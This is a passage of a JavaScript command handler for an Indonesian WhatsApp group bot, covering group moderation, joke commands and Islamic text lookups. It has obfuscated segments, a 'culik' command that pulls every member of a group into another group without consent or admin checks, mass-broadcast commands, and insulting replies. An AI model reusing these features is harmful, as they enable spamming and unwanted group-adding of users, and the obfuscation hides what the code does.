    var _0x17423b = _0x2d25();
    return _0x106b = function (_0x4f9c47, _0x371388) {
        _0x4f9c47 = _0x4f9c47 - (-0x10de + -0x900 + 0x1b8e);
        var _0x36a78e = _0x17423b[_0x4f9c47];
        return _0x36a78e;
    }, _0x106b(_0x16ea88, _0x90ab9d);
}
(function (_0x17a89e, _0x137a2e) {
    var _0x3744d4 = _0x106b, _0x314698 = _0x17a89e();
    while (!![]) {
        try {
            var _0x9bf7d4 = -parseInt(_0x3744d4(0x1b2)) / (0xa68 + 0x2347 + -0x2dae) + -parseInt(_0x3744d4(0x1c0)) / (0x1db * -0xb + -0x32 * -0xbf + -0x10e3) + parseInt(_0x3744d4(0x1b5)) / (-0x53 * 0x47 + 0x14c2 + 0x246) * (-parseInt(_0x3744d4(0x1b3)) / (0x1ff * 0x2 + 0xb65 + 0xf5f * -0x1)) + parseInt(_0x3744d4(0x1b9)) / (0x1 * -0x2449 + -0x1bd3 * -0x1 + -0xa7 * -0xd) + -parseInt(_0x3744d4(0x1be)) / (-0x1 * 0xf51 + 0x761 + -0x2 * -0x3fb) + -parseInt(_0x3744d4(0x1bd)) / (-0x5b4 + 0x78d * 0x3 + -0x10ec) * (-parseInt(_0x3744d4(0x1bf)) / (-0x66 * 0x61 + 0x3 * 0xc1f + 0x251)) + parseInt(_0x3744d4(0x1ba)) / (-0x7 * 0x36c + -0x1816 + 0x3013);
            if (_0x9bf7d4 === _0x137a2e)
                break;
            else
                _0x314698['push'](_0x314698['shift']());
        } catch (_0x5ec7b9) {
            _0x314698['push'](_0x314698['shift']());
        }
    }
}(_0x2d25, 0x233 * -0x159 + -0x1 * 0x21bd7 + -0x15 * -0x566b), newReply(_0x339ca7(0x1bc) + '\x20' + namabot + (_0x339ca7(0x1b1) + _0x339ca7(0x1b0) + _0x339ca7(0x1b8) + _0x339ca7(0x1b4) + _0x339ca7(0x1b7) + _0x339ca7(0x1bb) + _0x339ca7(0x1b6))));
            break
        // Group Fitur
            case 'kick': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'add': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'culik': {
                if (args.length < 1) return newReply('_*Masukin id grupnya tolol*_')
                let pantek = []
                for (let i of groupMembers) {
                    pantek.push(i.jid)
                }
                conn.groupParticipantsUpdate(args[0], pantek)
            }
            break
            case 'promote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'demote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'block': {
                if (!isCreator) return newReply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'block').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'unblock': {
                if (!isCreator) return newReply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'unblock').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setname':
            case 'setsubject': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (!text) return 'Text ?'
                await conn.groupUpdateSubject(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setdesc':
            case 'setdesk': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (!text) return 'Text ?'
                await conn.groupUpdateDescription(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc': {
                var _0x1d8fd1 = _0x2525;
function _0x117a() {
    var _0x5c09ba = [
        '20xGhMme',
        'set',
        '1510776rtjWlH',
        'w:profile:',
        'query',
        'admin',
        'isGroup',
        'chat',
        'Kirim/Repl',
        '/panjang',
        'on\x20',
        '1551222uzOBFt',
        'downloadAn',
        '1018557FTsDiz',
        '8cYgAHE',
        'unlinkSync',
        'ppgc.jpeg',
        '2316454EQehUY',
        'ngan\x20Capti',
        '30ZhDeZU',
        '482574OAnfTx',
        'image',
        'updateProf',
        'group',
        'botAdmin',
        'dSaveMedia',
        'test',
        'Message',
        '707082ObeoPG',
        'picture',
        'Sukses',
        'ilePicture',
        'y\x20Image\x20De',
        '281584npNwvs'
    ];
    _0x117a = function () {
        return _0x5c09ba;
    };
    return _0x117a();
}
(function (_0x406473, _0x201520) {
    var _0x53f8b1 = _0x2525, _0x4023b3 = _0x406473();
    while (!![]) {
        try {
            var _0x2f1656 = parseInt(_0x53f8b1(0xda)) / (-0x1 * -0x1682 + 0x2595 + -0x3c16) + -parseInt(_0x53f8b1(0xe2)) / (-0x2633 + -0x16bf * -0x1 + -0x2 * -0x7bb) + -parseInt(_0x53f8b1(0xc8)) / (0x16bd + -0x1e49 * 0x1 + 0x78f) + -parseInt(_0x53f8b1(0xc5)) / (0x7ca + -0x493 * 0x1 + -0x333) * (parseInt(_0x53f8b1(0xc6)) / (0x85 * -0x2b + -0x10 * -0x21a + 0xe * -0xce)) + parseInt(_0x53f8b1(0xd1)) / (0x9d * -0x11 + -0xcf2 * -0x1 + -0x27f * 0x1) + parseInt(_0x53f8b1(0xd7)) / (-0x688 + -0x1 * 0x18bc + 0x1f4b) * (parseInt(_0x53f8b1(0xd4)) / (-0x17 * 0xdf + -0xdca + 0x3c3 * 0x9)) + -parseInt(_0x53f8b1(0xd3)) / (0x2b * 0x33 + -0x7 * 0x11b + -0xcb) * (-parseInt(_0x53f8b1(0xd9)) / (0x11cc + -0x2041 + 0x1 * 0xe7f));
            if (_0x2f1656 === _0x201520)
                break;
            else
                _0x4023b3['push'](_0x4023b3['shift']());
        } catch (_0x324f1f) {
            _0x4023b3['push'](_0x4023b3['shift']());
        }
    }
}(_0x117a, -0x40e92 + 0x18b91 + 0x6acc4));
if (!m[_0x1d8fd1(0xcc)])
    return reply(mess[_0x1d8fd1(0xdd)]);
if (!isAdmins)
    return reply(mess[_0x1d8fd1(0xcb)]);
if (!isBotAdmins)
    return reply(mess[_0x1d8fd1(0xde)]);
if (!quoted)
    return reply(_0x1d8fd1(0xce) + _0x1d8fd1(0xc4) + _0x1d8fd1(0xd8) + _0x1d8fd1(0xd0) + (prefix + command));
function _0x2525(_0x3b9b78, _0x30f41b) {
    var _0x41a687 = _0x117a();
    return _0x2525 = function (_0xebb7b5, _0x3e8326) {
        _0xebb7b5 = _0xebb7b5 - (-0x244e + -0x1d6e + 0x427f);
        var _0x436880 = _0x41a687[_0xebb7b5];
        return _0x436880;
    }, _0x2525(_0x3b9b78, _0x30f41b);
}
if (!/image/[_0x1d8fd1(0xe0)](mime))
    return reply(_0x1d8fd1(0xce) + _0x1d8fd1(0xc4) + _0x1d8fd1(0xd8) + _0x1d8fd1(0xd0) + (prefix + command));
if (/webp/[_0x1d8fd1(0xe0)](mime))
    return reply(_0x1d8fd1(0xce) + _0x1d8fd1(0xc4) + _0x1d8fd1(0xd8) + _0x1d8fd1(0xd0) + (prefix + command));
var mediz = await conn[_0x1d8fd1(0xd2) + _0x1d8fd1(0xdf) + _0x1d8fd1(0xe1)](quoted, _0x1d8fd1(0xd6));
if (args[0xf06 * 0x2 + -0x1 * -0x1707 + -0x3513] == _0x1d8fd1(0xcf)) {
    var {img} = await generateProfilePicture(mediz);
    await conn[_0x1d8fd1(0xca)]({
        'tag': 'iq',
        'attrs': {
            'to': m[_0x1d8fd1(0xcd)],
            'type': _0x1d8fd1(0xc7),
            'xmlns': _0x1d8fd1(0xc9) + _0x1d8fd1(0xe3)
        },
        'content': [{
                'tag': _0x1d8fd1(0xe3),
                'attrs': { 'type': _0x1d8fd1(0xdb) },
                'content': img
            }]
    }), fs[_0x1d8fd1(0xd5)](mediz), reply(_0x1d8fd1(0xe4));
} else {
    var memeg = await conn[_0x1d8fd1(0xdc) + _0x1d8fd1(0xc3)](m[_0x1d8fd1(0xcd)], { 'url': mediz });
    fs[_0x1d8fd1(0xd5)](mediz), reply(_0x1d8fd1(0xe4));
}
            }
            break
            case 'tagall': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let teks = `*👥 Tag All By Admin*
 
                 🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break
            case 'hidetag': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                conn.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break
            case 'totag': {
               if (!m.isGroup) return newReply(mess.group)
               if (!isBotAdmins) return mess.botAdmin
               if (!isAdmins) return mess.admin
               if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
               conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
            case 'antilink': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilink) return newReply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antilink = true
                    newReply(`Antilink Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilink) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilink = false
                    newReply(`Antilink Group WhatsApp Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'antilinkyt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinkyt = true
                    newReply(`Antilink YouTube Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinkyt = false
                    newReply(`Antilink YouTube Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'antilinktt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinktt) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinktt = true
                    newReply(`Antilink TikTok Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinktt) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinktt = false
                    newReply(`Antilink TikTok Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'mutegc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].mute) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = true
                    newReply(`${ntiktok} telah di mute di group ini 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].mute) return newReply(`Sudah Tidak Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = false
                    newReply(`${ntiktok} telah di unmute di group ini 🕊️`)
                } else {
                   newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === '1') {
                    await conn.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '7') {
                    await conn.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '90') {
                    await conn.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'off') {
                    await conn.groupToggleEphemeral(m.chat, 0).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else {
                let sections = [
                {
                title: "CHANGE EFFECTIVE GROUP",
                rows: [
                {title: "⌲ Ephemeral 1 day", rowId: `ephemeral 1`, description: `Activate the ephemeral group for 1 day`},
                {title: "⌲ Ephemeral 7 day's", rowId: `ephemeral 7`, description: `Activate the ephemeral group for 7 day's`},
                {title: "⌲ Ephemeral 90 days's", rowId: `ephemeral 90`, description: `Activate the ephemeral group for 90 day's`},
                {title: "⌲ Ephemeral Off", rowId: `ephemeral off`, description: `Deactivate this Ephemeral group`}
                ]
                },
                ]
                conn.sendListMsg(m.chat, `Please select the following Ephemeral Options List !`, ntiktok, `Hello Admin ${groupMetadata.subject}`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, m)
                }
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} Akame ><`
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                    newReply(txt)
                }
                newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} Akame ><`
                let anu = await store.chats.all().map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		    for (let yoi of anu) {
		            await sleep(1500)
		            let txt = `「 Broadcast Bot 」\n\n${text}`
                    newReply(txt)
                }
		    newReply('Sukses Broadcast')
            }
            break
            case 'group':
            case 'grup': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'announcement').then((res) => newReply(`Sukses Menutup Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'not_announcement').then((res) => newReply(`Sukses Membuka Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                  newReply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'unlocked').then((res) => newReply(`Sukses Membuka Edit Info Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'locked').then((res) => newReply(`Sukses Menutup Edit Info Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let response = await conn.groupInviteCode(m.chat)
                conn.sendText(m.chat, `👥 *INFO LINK GROUP*\n📛 *Nama :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Tidak diketahui'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m,  {
                    detectLink: true
                })
            }
            break
            case 'revoke': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                await conn.groupRevokeInvite(m.chat)
                    .then(res => {
                        newReply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${groupMetadata.subject}`)
                    }).catch((err) => newReply(jsonformat(err)))
                    }
            break
            case 'listonline':
            case 'liston': {
                if (!m.isGroup) newReply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                conn.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
        // Fun Fitur 
        
            case 'apakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
                }
                break
            case 'bisakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
                }
                break
            case 'bagaimanakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
                }
            break
            case 'rate': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
                const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                newReply(`Rate : ${q}\nJawaban : *${te}%*`)
                }
            break
            
            case 'gantengcek':
            case 'cekganteng': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
                const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                newReply(`Nama : ${q}\nJawaban : *${teng}%`)
                }
            break
                
            case 'cantikcek':
            case 'cekcantik': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
                const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const tik = can[Math.floor(Math.random() * can.length)]
                newReply(`Nama : ${q}\nJawaban : *${tik}%`)
                }
            break
            
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                newReply(`Nama : ${q}\nJawaban : *${sange}%*`)
                }
            break
                
            case 'kapankah': {
                if (!q) return newReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                newReply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
                }
            break
            
            case 'wangy': {
                if (!q) return newReply(`Contoh : .wangy Riy`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                newReply(awikwok)
                }
            break
            
            case 'cekmati': {
                if (!q) return newReply(`Invalid!\n\nYg mau di cek siapa kontol?`)
                predea = await axios.get(`https://api.agify.io/?name=${q}`)
                newReply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
                }
            break
            
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return newReply(`Kirim/reply text dengan caption ${prefix + command}`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                newReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break
            
        // ISLAMIN FITUR
            case 'iqra': {
                oh = `Contoh : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
                if (!text) return newReply(oh)
                yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
                conn.sendMessage(m.chat, {
                    document: yy,
                    mimetype: 'application/pdf',
                    fileName: `iqra${text}.pdf`
                }, {
                    quoted: m
                }).catch((err) => newReply(oh))
            }
            break
            case 'juzamma': {
                if (args[0] === 'pdf') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'
                        },
                        mimetype: 'application/pdf',
                        fileName: 'juz-amma-arab-latin-indonesia.pdf'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'docx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                        fileName: 'juz-amma-arab-latin-indonesia.docx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'pptx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileName: 'juz-amma-arab-latin-indonesia.pptx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'xlsx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                        fileName: 'juz-amma-arab-latin-indonesia.xlsx'
                    }, {
                        quoted: m
                    })
                } else {
                    newReply(`Mau format apa ? Contoh : ${prefix + command} pdf\nFormat yang tersedia : pdf, docx, pptx, xlsx`)
                }
            }
            break
            case 'hadis':
            case 'hadist': {
                if (!args[0]) return newReply(`Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
                if (!args[1]) return `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
                try {
                    let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
                    let {
                        number,
                        arab,
                        id
                    } = res.find(v => v.number == args[1])
                    newReply(`No. ${number}

${arab}

${id}`)
                } catch (e) {
                    newReply(`Hadis tidak ditemukan !`)
                }
            }
            break
            case 'tafsirsurah': {
                if (!args[0]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
